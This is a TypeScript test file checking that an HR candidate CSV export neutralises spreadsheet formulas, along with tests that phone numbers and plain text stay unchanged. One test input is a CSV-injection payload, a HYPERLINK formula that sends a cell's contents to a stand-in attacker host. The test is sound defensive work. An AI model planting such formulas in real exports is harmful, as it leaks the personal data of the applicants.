import { inertText, tablesCsv } from '../table-files';

describe('the HR export CSV', () => {
  const file = (rows: (string | number | null)[][]) => ({
    title: 'Candidats',
    subtitle: 'Offre',
    tables: [{ name: 'Candidats', header: ['Nom', 'Téléphone', 'Note'], rows }],
  });

  it('keeps a formula an applicant typed as text', () => {
    const csv = tablesCsv(
      file([
        ['=HYPERLINK("http://attacker.invalid/?"&A1;"Voir")', '=1+1', 3],
        ['@SUM(A1)', '-2+3', 4.5],
      ]),
    );
    expect(csv).toContain(
      `"'=HYPERLINK(""http://attacker.invalid/?""&A1;""Voir"")";'=1+1;3`,
    );
    expect(csv).toContain(`'@SUM(A1);'-2+3;4,5`);
  });

  it('leaves numbers, phone numbers and ordinary text alone', () => {
    expect(inertText('+242 06 123 45 67')).toBe('+242 06 123 45 67');
    expect(inertText('Awa Ngoma')).toBe('Awa Ngoma');
    expect(inertText('+33 1=2')).toBe("'+33 1=2");
    expect(tablesCsv(file([['Awa', '+242061234567', -1]]))).toContain(
      'Awa;+242061234567;-1',
    );
  });
});
